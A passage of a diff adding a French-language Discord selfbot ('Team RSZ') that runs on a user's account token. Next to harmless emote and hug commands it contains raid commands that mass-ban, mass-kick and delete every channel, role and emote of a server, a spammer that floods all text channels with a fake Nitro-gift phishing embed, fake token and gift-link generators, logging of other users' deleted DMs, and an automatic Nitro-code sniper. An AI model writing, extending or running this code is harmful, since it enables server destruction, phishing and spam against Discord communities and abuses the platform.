+    .setImage(response.body.message)
+    .setColor(color)
+    msg.edit(anal).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+    console.log("╟ Commande anal executé")
+  console.log("╟─────────────────────────────────╢")
+  });
+  }
+  if(message.content.startsWith(prefix + 'fight')){
+    if(!mentionuser)return msg.edit(":x: **Aucun utilisateur mentionné**");
+    var debitage_embed = new Discord.RichEmbed()
+    .setColor(color)
+    .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+    .setTitle(mentionuser.username + " __**VS**__ " + client.user.username)
+    .setImage("https://data.photofunky.net/output/image/b/e/9/2/be9268/photofunky.gif")
+   message.edit(debitage_embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+   console.log("╟ Commande fight executé")
+   console.log("╟─────────────────────────────────╢")
+  }
+
+if(message.content.startsWith(prefix + 'boom')){
+  if(!mentionuser)return msg.edit(":x: **Aucun utilisateur mentionné**")
+    var boom_embed = new Discord.RichEmbed()
+    .setColor(color)
+    .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+    .setTitle(mentionuser.username + " **Ce Fait Explosé Par **💣💥 " + client.user.username)
+    .setImage("	")
+    message.edit(boom_embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+    console.log("╟ Commande boom executé")
+  console.log("╟─────────────────────────────────╢")
+}
+   if(message.content === prefix+ 'shutdown'){
+    msg.delete().then(() => process.exit(1))
+    console.log("╟ Le selfbot est eteint")
+  console.log("╟─────────────────────────────────╢")
+  }
+  if (message.content.startsWith(prefix + "kick")) {
+    let serveur = message.guild;
+    if(!serveur){
+      message.edit(':x: **Veuillez executer cette commande sur un serveur!**');
+      return;
+    }
+    if(!mentionuser){
+      message.edit(':x: **Veuillez mentionner un utilisateur!**');
+      return;
+    }
+    mentionuser.kick().then((member) => {
+        message.edit(":wave: " + member.displayName + " has been successfully kicked :point_right: ");
+    }).catch(() => {
+        message.edit(":x: **Access Denied**");
+    });
+    console.log("╟ Commande kick executé")
+  console.log("╟─────────────────────────────────╢")
+}
+if (message.content.startsWith(prefix + "ban")) {
+  let serveur = message.guild;
+  if(!serveur){
+    message.edit(':x: **Veuillez executer cette commande sur un serveur!**');
+    return;
+  }
+  if(!mentionuser){
+    message.edit(':x: **Veuillez mentionner un utilisateur!**');
+    return;
+  }
+  mentionuser.ban().then((member) => {
+        message.edit(":wave: " + member.displayName + " has been successfully banned https://gfycat.com/playfulfittingcaribou :point_right: ");
+    }).catch(() => {
+        message.edit(":x: **Access Denied**");
+    });
+    console.log("╟ Commande ban executé")
+  console.log("╟─────────────────────────────────╢")
+}
+if(message.content.startsWith(prefix + 'name all')){
+  let serveur = message.guild;
+  if(!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**');
+	const usermsg = message.content.split(" ").slice(2).join(" ") || message.author.username
+	if(!message.member.hasPermission('MANAGE_NICKNAMES')) return message.delete().then(console.log('[','ERROR'.red,']','permission insuffisante'.green))
+  const dmusers = message.guild.members;
+  msg.edit(`Je renomme tout le monde par ${usermsg}`)
+	dmusers.forEach(dmuser => {
+		dmuser.setNickname(usermsg).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+  })
+  console.log("╟ Commande name all executé")
+  console.log("╟─────────────────────────────────╢")
+}
+
+if(message.content === prefix + 'all ban'){
+  let serveur = message.guild;
+  if(!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**');
+if(!message.member.hasPermission('BAN_MEMBERS')) return message.delete().then(console.log('[','ERROR'.red,']','permission insuffisante'.green))
+ message.guild.members.forEach(dmuser => {
+   setInterval(() => {
+  if(!dmuser.bannable) return;
+  dmuser.ban().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+}, 1000);
+})
+console.log("╟ Commande ban all executé")
+console.log("╟─────────────────────────────────╢")
+}
+if(message.content === prefix + 'all kick'){
+let serveur = message.guild;
+if(!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**');
+if(!message.member.hasPermission('KICK_MEMBERS')) return message.delete().then(console.log('[','ERROR'.red,']','permission insuffisante'.green))
+const dmusers = message.guild.members
+dmusers.forEach(dmuser => {
+  if(!dmuser.kickable) return;
+  dmuser.kick().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+})
+console.log("╟ Commande kick all executé")
+console.log("╟─────────────────────────────────╢")
+}
+  if(message.content.startsWith(prefix + 'purge')){
+    message.channel.fetchMessages().then((message) =>
+    message.forEach(m =>{
+      if(m.author.id === client.user.id){
+        m.delete().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+    }
+  }
+    ));
+    console.log("╟ Commande purge executé")
+    console.log("╟─────────────────────────────────╢") ;
+  }
+  if(message.content === prefix + 'smile'){
+    let rireembed = new Discord.RichEmbed();
+    rireembed.setColor(color)
+    .setTitle(`**${client.user.username} sourit :**`)
+    .setTimestamp()
+    .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+    .setImage(rire[Math.floor(Math.random() * rire.length)])
+    message.edit(rireembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+    console.log("╟ Commande smile executé")
+  console.log("╟─────────────────────────────────╢")
+  }
+  if(message.content.startsWith(prefix + 'kiss')){
+    if(!mentionuser){
+      message.edit(':x: **Veuillez mentionner un utilisateur!**');
+      return;
+    }
+    let kissembed = new Discord.RichEmbed();
+    kissembed.setColor(color)
+    .setTitle(`**${client.user.username} kiss ${mentionuser.username}**`)
+    .setTimestamp()
+    .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+    .setImage(kiss[Math.floor(Math.random() * kiss.length)])
+    message.edit(kissembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+    console.log("╟ Commande kiss executé")
+  console.log("╟─────────────────────────────────╢")
+  }
+  if(message.content.startsWith(prefix + 'blush')){
+    let veskiembed = new Discord.RichEmbed();
+    veskiembed.setColor(color)
+    .setTitle(`**${client.user.username} rougit!**`)
+    .setTimestamp()
+    .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+    .setImage(veski[Math.floor(Math.random() * veski.length)])
+    message.edit(veskiembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+    console.log("╟ Commande blush executé")
+    console.log("╟─────────────────────────────────╢")
+  }
+  if(message.content.startsWith(prefix +"load")){
+    message.delete(); var charge = "▓";
+    var chargeC = "█";
+    message.channel.send("```[" + charge.repeat(25) + "]```").then((message) => { for (i = 0; i <= 25; i++) { message.edit("```[" + chargeC.repeat(i) + charge.repeat(25 - i) + "]  -  " + i * 50 / 25 + "%\n" + "loading..```");
+  }message.edit("`Chargement Fini.`").catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+  console.log("╟ Commande load executé")
+  console.log("╟─────────────────────────────────╢")
+})
+}
+if(message.content === prefix +"delete all channel"){
+  let serveur = message.guild;
+  if(!serveur){
+    message.edit(':x: **Veuillez executer cette commande dans un serveur!**');
+    return;
+  }
+    if(!message.member.hasPermission('MANAGE_CHANNELS')) return message.delete().then(console.log('[','ERROR'.red,']','permission insuffisante'.green))
+      var channels = message.guild.channels
+      channels.forEach(chan => {
+        chan.delete().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+      })
+      console.log("╟ Commande delete all channel executé")
+      console.log("╟─────────────────────────────────╢")
+      
+}
+if(message.content === prefix +"delete all role"){
+  let serveur = msg.guild;
+  if(!serveur){
+    message.edit(':x: **Veuillez executer cette commande sur un serveur!**');
+    return;
+  }
+  message.guild.roles.forEach(roles =>{
+    roles.delete().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green))
+  })
+  console.log("╟ Commande delete all role executé")
+  console.log("╟─────────────────────────────────╢")
+}
+if(message.content.startsWith(prefix + 'punch')){
+  if(!mentionuser){
+    message.edit(':x: **Veuillez mentionner un utilisateur!**');
+    return;
+  }
+  let punchembed = new Discord.RichEmbed();
+  punchembed.setColor(color)
+  .setTitle(`**${client.user.username} frappe ${mentionuser.username}**`)
+  .setTimestamp()
+  .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+  .setImage(punch[Math.floor(Math.random() * punch.length)])
+  message.edit(punchembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+  console.log("╟ Commande punch executé")
+  console.log("╟─────────────────────────────────╢")
+}
+if(message.content.startsWith(prefix + 'hug')){
+  if(!mentionuser){
+    message.edit(':x: **Veuillez mentionner un utilisateur!**');
+    return;
+  }
+  let hughtembed = new Discord.RichEmbed();
+  hughtembed.setColor(color)
+  .setTitle(`**${client.user.username} fait un calin a ${mentionuser.username} **`)
+  .setTimestamp()
+  .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+  .setImage(hugh[Math.floor(Math.random() * hugh.length)])
+  message.edit(hughtembed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+  console.log("╟ Commande hug executé")
+  console.log("╟─────────────────────────────────╢")
+}
+if(message.content.startsWith(prefix + 'set serveur name')) {
+  let arg = args.splice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";
+  message.edit(`Changement du nom du serveur pour: ` + arg);
+  message.guild.setName(arg)
+  console.log("╟ Commande set serveur name executé")
+  console.log("╟─────────────────────────────────╢")
+}
+if (message.content.startsWith(`${prefix}token`)){
+  if(!mentionuser){
+    message.edit(':x: **Veuillez mentionner un utilisateur!**');
+    return;
+  }
+  let token = ["HircHg", "XnyXiA", "XluxwQ","XXn_KA","Xiq-WQ"];
+  let token1 = ["a6uny9jcMjet2W2LASruribq6VI", "oZyGJDamSJ4hmJaaLvzdNo1bLqk", "3_6Xt2k4OieDKimnNYGWUq9vJRo","xllelHltGdY7DP_0s1XST4cgzTs"];
+  var id = mentionuser.id;
+  var bytes = utf8.encode(id);
+  var encoded = base64.encode(bytes);
+  let embed_encode = new Discord.RichEmbed()
+      .setColor(`${color}`)
+      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+      .setTitle(`Token match ${mentionuser.username}`)
+      .setDescription(`${encoded}.${token[Math.floor(Math.random() * token.length)]}.${token1[Math.floor(Math.random() * token1.length)]}`)
+      setTimeout(() => {
+        message.edit("░░░░░░░░░░ 0%");
+        }, 1000);
+        setTimeout(() => {
+        message.edit("▓▓░░░░░░░░ 20%");
+        }, 1500);
+       setTimeout(() => {
+       message.edit("▓▓▓▓░░░░░░ 40%");
+       }, 2000);
+      setTimeout(() => {
+      message.edit("▓▓▓▓▓▓░░░░ 60%");
+      }, 2500);
+     setTimeout(() => {
+     message.edit("▓▓▓▓▓▓▓▓░░ 80%");
+     }, 3000);
+     setTimeout(() => {
+     message.edit("▓▓▓▓▓▓▓▓▓▓ 100%");
+     }, 3500);
+     setTimeout(() => {
+    message.edit(embed_encode).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+  }, 4000)
+  console.log("╟ Commande token executé")
+  console.log("╟─────────────────────────────────╢")
+  }
+if (message.content.startsWith(`${prefix}encode`)){
+  var text = args.join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";;
+  var bytes = utf8.encode(text);
+  var encoded = base64.encode(bytes);
+  let embed_encode = new Discord.RichEmbed()
+      .setColor(`${color}`)
+      .setTitle("Texte -> Base64 :")
+      .setDescription(encoded)
+    message.edit(embed_encode).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+    console.log("╟ Commande encode executé")
+    console.log("╟─────────────────────────────────╢")
+  }
+  if(message.content.startsWith(`${prefix}lovecalc`)){
+    let rep = ["5%", "10%", "15%" , "20%" , "25%" , "30%" , "35%" , "40%" , "45%" , "50%" , "55" , "60%" , "65%" , "70%" , "75%" , "80%" , "85%" , "90%" , "95%" , "100%"];
+    let reptaille = Math.floor((Math.random() * rep.length));
+    let question = args.slice(0).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉";;
+    let embed = new Discord.RichEmbed()
+      .setAuthor(message.author.tag)
+      .setColor("ORANGE")
+      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+      .setThumbnail(`${message.author.avatarURL}`)
+      .addField("calcul de relation plausible ❤", question)
+      .addField("relation estimée à ❤", rep[reptaille]);
+    message.edit(embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+    console.log("╟ Commande lovecalc executé")
+    console.log("╟─────────────────────────────────╢")
+  }
+  if (message.content.startsWith(prefix + 'spotify')) {
+            const usermsg = message.content.split(" ").slice(1).join(" ") || "𝚃𝚎𝚊𝚖 𝚁𝚂𝚉"
+            let presence = rpcGenerator.createSpotifyRpc(client)
+
+                .setAssetsLargeImage("spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e")
+                .setAssetsSmallImage("spotify:ab67616d0000b2739501a78fed26d59bb86d1d9e")
+                .setDetails(usermsg)
+                .setState("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉")
+                .setStartTimestamp(Date.now())
+                .setEndTimestamp(Date.now() + 86400000)
+            client.user.setPresence(presence.toDiscord()).then(message.edit(`:white_check_mark: **Tu écoutes ${usermsg} sur spotify**`)).catch(console.error)
+            console.log("╟ Commande spotify executé")
+            console.log("╟─────────────────────────────────╢")
+  }
+  if(message.content.startsWith(`${prefix}reset`)) {
+    clearInterval();
+    client.user.setActivity(null, {});
+    message.edit(`:information_source:  Votre statut a été réinitialisé ! :information_source:`).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+    console.log('Commande reset effectué'.yellow)
+    }
+      if(message.content === `${prefix}nitro`){
+          const genEmbed = new Discord.RichEmbed()
+              .setColor(color)
+              .setThumbnail('https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif')
+              .addField("Gift :", " https:/"+"/discord.gift/" + nitrocode(16,'0aA'))
+              message.edit(genEmbed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+              console.log("╟ Commande gen nitro executé")
+              console.log("╟─────────────────────────────────╢")
+    }
+    if (msg.content.startsWith(prefix + 'gen token')) {
+      msg.delete()
+      setTimeout(() => {
+      client.destroy().catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+      }, 1500);
+      console.log("╟ Commande gen token executé")
+      console.log("╟─────────────────────────────────╢")
+    }
+    if(msg.content.startsWith(prefix + "reverse")){
+      let reverse = args.splice(1).join(' ');
+      if(!reverse){
+        message.edit(':x: **Pas de test definit**')
+      }
+      function reverseString(str) {
+      return str.split("").reverse().join("");
+      }
+      let sreverse = reverseString(reverse)
+      if(args[0] === sreverse) {
+      sreverse = `${args.splice(1).join(" ")}`
+      }
+      msg.edit(`${sreverse}`).catch(console.error);
+      console.log("╟ Commande reverse executé")
+      console.log("╟─────────────────────────────────╢")
+    }
+    if (msg.content.startsWith(prefix + 'discord')) {
+      let discord = new Discord.RichEmbed()
+      .setColor(color)
+      .setDescription(`Discord Version : **${Discord.version}**`)
+      .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+      msg.edit(discord).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+      console.log("╟ Commande discord executé")
+      console.log("╟─────────────────────────────────╢") 
+    }
+      if(message.content === prefix + 'restart'){
+        message.edit('**redémarrage** du self bot...').then(client.destroy()).then(() => client.login(token));
+        console.log("╟ Commande restart executé")
+        console.log("╟─────────────────────────────────╢")
+      }
+      if(message.content === prefix + 'stop spam'){
+        message.edit('**Stop Spam effectué**').then(client.destroy()).then(() => client.login(token));
+        console.log("╟ Commande stop spam executé")
+        console.log("╟─────────────────────────────────╢")
+      }
+    if(message.content.startsWith(prefix + 'role info' || prefix + 'ri')){
+      let serveur = message.guild;
+      let gRole = message.mentions.roles.first();
+      if(!serveur) return msg.edit(':x: **Commande uniquement utilisable sur un serveur**')
+          if(!gRole) return message.delete().then(console.log('[','ERROR'.red,']','un nom de rôle est nécessaire'.green))
+          const status = {
+              false: "Non",
+              true: "oui"
+            }
+          let roleEmbed = new Discord.RichEmbed()
+          .setColor(color)
+          .setDescription(`<@&${gRole.id}>`)
+          .addField('id du role:', gRole.id)
+          .addField('couleur:', gRole.hexColor)
+          .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+          .addField('nombre de membres ayant ce role:', gRole.members.size)
+          .addField('position:', gRole.position)
+          .addField('mentionnable:', status[gRole.mentionable])
+          if(!message.member.hasPermission('EMBED_LINKS')) return message.edit(`:x: **permission insuffisante (embed_links)**\n<@&${gRole.id}>\n\nid du role: ${gRole.id}\ncouleur du role: ${gRole.hexColor}\nmembres ayant ce role: ${gRole.members.size}\nposition: ${gRole.position}\nmentionnable: ${status[gRole.mentionable]}`)
+          console.log("╟ Commande role info executé")
+          console.log("╟─────────────────────────────────╢")
+          message.edit(roleEmbed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'))
+    }
+    if(message.content.startsWith(prefix + "add emote")){
+      if(message.channel.type === "dm"){
+        message.edit(':x: **Commande pas executable en mp**')
+        return;
+        }
+      let arg = args.splice(2).join(" ");
+      let customemoji = Discord.Util.parseEmoji(arg);
+      
+      if(!args){
+        message.edit(':x: **Veuillez choisir une emote.**')
+        return;
+      }
+      if(!customemoji){
+        message.edit(`:x: **Emote invalide essayez ceci** ${prefix}add emote (emote) <name>`)
+        return;
+      }
+      if(!message.member.hasPermission('MANAGE_EMOJIS')){
+        message.edit(':x: **Vous n\'avez pas les permissions "Gérer les emojis" sur ce serveur**')
+        return;
+      }
+      if (customemoji.id) {
+        const Link = `https://cdn.discordapp.com/emojis/${customemoji.id}.${
+          customemoji.animated ? "gif" : "png"
+        }`;
+        let name = message.content.split(" ").splice(3) || customemoji.name;
+        message.guild.createEmoji(
+          `${Link}`,
+          `${name}`
+        );
+        message.edit(':white_check_mark: **Emote ajoutée au serveur.**')
+    console.log("Commande add emote executé.".yellow)
+    }else
+    message.edit(':x: **Veuillez choisir une emote valide!**')
+  }
+  if(message.content === prefix + "emote"){
+    if(message.channel.type === "dm"){
+      message.edit(':x: **Commande pas executable en mp**')
+      return;
+      }
+    let Emojis = "";
+        let EmojisAnimated = "";
+        let EmojiCount = 0;
+        let Animated = 0;
+        let OverallEmojis = 0;
+        function Emoji(id){
+            return client.emojis.get(id).toString()
+        }
+        message.guild.emojis.forEach(emoji => {
+            OverallEmojis++;
+            if(emoji.animated) {
+                Animated++
+                EmojisAnimated+=Emoji(emoji.id)
+            } else {
+                EmojiCount++;
+                Emojis+=Emoji(emoji.id)
+        }})
+        let embed = new Discord.RichEmbed()
+        .setTitle(`Emojis dans: **${message.guild.name}**`)
+        .setFooter('𝚃𝚎𝚊𝚖 𝚁𝚂𝚉')
+        .setColor(color)
+        .addField(`Emojis animés: [${Animated}]`, EmojisAnimated || `None`)
+        .addField(`Emojis [${EmojiCount}]`, Emojis || `None`)
+        .addField('Total d\'emojis', OverallEmojis || `None`)
+        message.edit(embed);
+        console.log("╟ Commande emote executé")
+        console.log("╟─────────────────────────────────╢")
+      }
+      if(message.content.startsWith(prefix + "remove emote")){
+        if(message.channel.type === "dm"){
+          message.edit(':x: **Commande pas executable en mp**')
+          return;
+          }
+        if (!message.member.hasPermission(`MANAGE_EMOJIS`)) {
+          return message.edit(":x: **Vous n\'avez pas les permissions \"Gérer les emojis\" sur ce serveur**")
+        }
+        const emoji = args.splice(2).join(" ");
+        if (!emoji) return message.edit(`:x: **Veuillez choisir une emote.**`);
+        let customemoji = Discord.Util.parseEmoji(emoji);
+          if(!message.guild.emojis.forEach(emote => {
+            if(!emote.id === customemoji.id){ 
+              return message.channel.send(`:x: **Cette emote n'est pas sur le serveur**.`)
+            }}))
+          return message.edit(":white_check_mark: **Emote correctement supprimée du serveur.**");
+          if (customemoji.id) {
+            const Link = `https://cdn.discordapp.com/emojis/${customemoji.id}.${
+              customemoji.animated ? "gif" : "png"
+            }`;
+          message.guild.emojis.get(customemoji.id).delete();
+        } else {
+          let CheckEmoji = parse(emoji, { assetType: "png" });
+          if (!CheckEmoji[0])
+            return message.edit(`:x: **Veuillez choisir une emote valide**!`);
+          message.edit(`:x: **Vous ne pouvez pas supprimer les emotes par defaut**!`);
+        };
+        console.log("╟ Commande remove emote executé")
+        console.log("╟─────────────────────────────────╢")
+      }
+      if(message.content.startsWith(prefix + 'embed_spammer')){
+        let embed_2 = new Discord.RichEmbed()
+        .setAuthor("© Discord Nitro Classic Gift")
+        .setColor("#0027ff")
+        .setThumbnail("https://emoji.gg/assets/emoji/6234_nitro_booster_s.gif")
+        .setImage("https://miro.medium.com/max/2560/0*Atmf_-eFRoumfr9j.png")
+        .addField('Claim You\'re Gift', '\n[https://discord.gift/sE7gEpcDQDUZKexV](https://discord.gg/rosa)')
+        .setFooter("𝚃𝚎𝚊𝚖 𝚁𝚂𝚉");
+        message.guild.channels.filter(c=> c.type === "text").forEach(salontxt=>{
+          setInterval(() => {
+            salontxt.send(embed_2)
+          }, 450);
+        })
+        console.log("╟ Commande spam embed")
+        console.log("╟─────────────────────────────────╢")
+        return;
+      }
+      if(message.content.startsWith(prefix + "steal banniere")){
+        message.delete()
+      let banner = message.guild.bannerURL;
+      console.log(`"╟ Voici la banniere de ${message.guild.name}: ${banner} "`)
+      console.log("╟─────────────────────────────────╢")
+      }
+      if(message.content.startsWith(prefix + "steal emote")){
+        if(message.channel.type === "dm"){
+        message.edit(':x: **Commande pas executable en mp**')
+        return;
+        }
+        let arg = args.splice(2).join(" ");
+        let serveurid = client.guilds.get(arg);
+        if(!serveurid){
+          message.edit(`:x: **Aucun serveur trouvable avec l'id** "${arg}"`)
+        return;
+        }
+        if (!message.member.hasPermission(`MANAGE_EMOJIS`)) {
+          return message.edit(":x: **Vous n\'avez pas les permissions \"Gérer les emojis\" sur ce serveur**")
+        }
+        if(serveurid.emojis.size < 1){
+          message.edit(':x: **Le serveur ne contient aucun emote.**')
+        }
+        let i = "1";       
+        serveurid.emojis.forEach(emote => {
+          setTimeout(() => {
+          let name = emote.name;
+          const Link = `https://cdn.discordapp.com/emojis/${emote.id}.${
+          emote.animated ? "gif" : "png"
+        }`
+          message.guild.createEmoji(
+            `${Link}`,
+            `${name}`
+          ).catch(error => i + "1");
+        }, 1000);
+      });
+      console.log("╟ Commande steal emote executé")
+      console.log("╟─────────────────────────────────╢")
+          message.edit(`:white_check_mark: **J'ai volé les emotes du serveur** "${serveurid.name}"`)
+      }
+      if(message.content === prefix + "delete all emote"){
+        if(message.channel.type === "dm"){
+          message.edit(':x: **Commande pas executable en mp**')
+          return;
+          }
+        if(message.guild.emojis.size < 1) { 
+          message.edit(':x: **Il n\' y a aucun emote a supprimer.**') 
+          return;
+        }
+      message.guild.emojis.forEach(emote => {
+        message.guild.emojis.get(emote.id).delete();
+      });
+      };
+      if(message.content.startsWith(prefix + "grab pp")){
+        let voled = message.mentions.users.first();
+        let targetpp = voled.avatarURL;
+        if(!voled){ message.edit(":x: **Veuillez mentionner un utilisateur valide!**") 
+        return;
+      };
+      if(!targetpp){ message.edi(":x: **Cet utilisateur n'a pas d'avatar!**")
+      return;
+      };
+      client.user.setAvatar(targetpp);
+      console.log("╟ Commande grab pp executé")
+      console.log("╟─────────────────────────────────╢")
+      message.edit(`:white_check_mark: **J'ai correctement volé la photo de profile de ** "${voled.username}"`) 
+    };
+try {
+  let info = client.emojis.get("655091815401127966") || "ℹ️"; //https://cdn.discordapp.com/emojis/655091815401127966.png?v=1
+  let waiting = client.emojis.get("655695570769412096") || "⌛"; //https://images-ext-1.discordapp.net/external/lWj3uW4qvfFB9t0QgGsDJ8vLvh5bSObQ-wwUxYFH4wo/https/images-ext-1.discordapp.net/external/AzWR8HxPJ4t4rPA1DagxJkZsOCOMp4OTgwxL3QAjF4U/https/cdn.discordapp.com/emojis/424900448663633920.gif
+  let green = client.emojis.get("655696285286006784") || "✅"; //https://images-ext-2.discordapp.net/external/NU9I3Vhi79KV6srTXLJuHxOgiyzmEwgS5nFAbA13_YQ/https/cdn0.iconfinder.com/data/icons/small-n-flat/24/678134-sign-check-512.png
+  let error = client.emojis.get("655704809483141141") || "❌"; //https://cdn.discordapp.com/emojis/655704809483141141.png?v=1
+  let warning = client.emojis.get("656030540310380574") || "⚠️"; //https://cdn.discordapp.com/emojis/656030540310380574.png?v=1
+  if (message.content === prefix + 'backup friend') {
+            var friendCount = client.user.friends.size
+            const friends = client.user.friends.array()
+            let haste = `backup friends créé avec succès ${friends.length.toString().bold} friends.`.green
+            console.log(haste)
+            hastebins(`${friends}\n`).then(r => {
+                var embed = new Discord.RichEmbed()
+                    .setTitle("backup friends (<@id>)")
+                    .addField('```lien hastebins```', r)
+                    .setColor(color)
+                    .setTimestamp()
+                    .setDescription("***vous pouvez copier coller la liste sur le channel actuel et vous pourrez ensuite faire clique droit sur un pseudo / envoyer un message / add friend ect...***")
+                message.edit(embed).catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
+                console.log("╟ Comande friend backup executé")
+                console.log("╟─────────────────────────────────╢")
+            }
+  
+            ) } 
+
+  function makeid(length) {
+    var result = "";
+    var characters =
+      "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    var charactersLength = characters.length;
+    for (var i = 0; i < length; i++) {
+      result += characters.charAt(
+        Math.floor(Math.random() * charactersLength)
+      );
+    }
+    return result;
+  }
+
+  function save() {
+    fs.writeFile("./Data/backups.json", JSON.stringify(backups), err => {
+      if (err) console.error(err);
+    });
+  }
+} catch (error) {
+  return;
+}
+})
+
+function saving() {
+    fs.writeFile("./Data/afk.json", JSON.stringify(afk), err => {
+      if (err) console.error(err);
+    });
+  }
+  function liste() {
+    fs.writeFile("./Data/liste.json", JSON.stringify(lbackup), err => {
+      if (err) console.error(err);
+    });
+  }
+  function kicker() {
+    fs.writeFile("./Data/vkick.json", JSON.stringify(kicked), err => {
+      if (err) console.error(err);
+    });
+  }
+client.on("messageUpdate", message => {
+  if(message.author.id === client.user.id)return;
+  if(message.channel.type === "dm"){
+    console.log('╟─────────────────────────────────╢'.blue)
+    console.log(`║--> message mp modifié \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║--> At: ${message.createdAt}`.blue) 
+  }
+})
+client.on("messageDelete", message => {
+  if(message.author.id === client.user.id)return;
+  if(message.channel.type === "dm"){
+    console.log('╟─────────────────────────────────'.blue)
+    console.log(`║--> 1 message mp surppimé \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║--> At: ${message.createdAt}`.blue) 
+  }
+  if(message.content.includes('@everyone') || message.content.includes('@here')){
+    if(message.author.id === client.user.id)return;
+    if(message.channel.type === "dm")return;
+    console.log('╟─────────────────────────────────'.blue)
+    console.log(`║--> New ghostping \n║--> serveur: ${message.guild.name} \n║--> channel: ${message.channel.name} \n║--> User: ${message.author.tag}\n║--> Content: ${message.content}\n║-->At: ${message.createdAt}`.blue)
+  }else return
+})
+
+
+
+function matchCode(text, callback){
+  let codes = text.match(/https:\/\/discord\.gift\/[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789]+/)
+  if(codes){
+      callback(codes[0])
+      return matchCode(text.slice(codes.index+codes[0].length), callback)
+  }else{
+      callback(null)
+  }
+}
+
+client.on("message", message => {
+  let codes = []  
+  matchCode(message.content, (code) => {
+      if(!code)return
+      if(!codes.includes(code))codes.push(code)
+  })
+  if(codes.length == 0)return
+  codes.forEach(code => {
+      fetch("https://canary.discordapp.com/api/v6/entitlements/gift-codes/"+code.split("/").pop()+"/redeem", {
+          method: "post",
+          headers: {
+              "Accept": "*/*",
+              "Accept-Encoding": "gzip, deflate, br",
+              "Accept-Language": "en-US",
+              "Authorization": client.token,
+              "Connection": "keep-alive",
+              "Content-Length": JSON.stringify({channel_id: message.channel.id}).length,
+              "Content-Type": "application/json",
+              "Host": "canary.discordapp.com",
+              "Referer": `https://canary.discordapp.com/channels/${message.channel.id}/${message.id}`,
+              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
+              "X-super-properties": Buffer.from(JSON.stringify({
+                  "os":"Windows",
+                  "browser":"Firefox",
+                  "device":"",
+                  "browser_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0",
+                  "browser_version":"66.0",
+                  "os_version":"10",
+                  "referrer":"",
+                  "referring_domain":"",
+                  "referrer_current":"",
+                  "referring_domain_current":"",
+                  "release_channel":"canary",
+                  "client_build_number":37519,
+                  "client_event_source":null
+              }), "utf-8").toString("base64")
+          },
+          body: JSON.stringify({channel_id: message.channel.id})
+      }).then(res => {
+          if(res.status == 400 || res.status == 404)return console.log(`code invalide :  ${code}`.red)
+          res.json().then(json => {
+              console.log(json)
+              console.log("Un nouveau nitro à sûrement été ajouté à tes crédits.".green)
+          })
+      }).catch(console.error)
+  })
+})
+
+client.on('guildDelete', guild =>{
+  console.log('╟─────────────────────────────────╢'.blue)
+  console.log(`║--> Vous avez quitté le serveur ${guild.name}`.blue)
+})
+
+client.on('guildCreate', guild =>{
+  console.log('╟─────────────────────────────────╢'.blue)
+  console.log(`║--> Vous avez rejoint le serveur ${guild.name}`.blue)
+})
+
+client.login(token).catch(err =>{
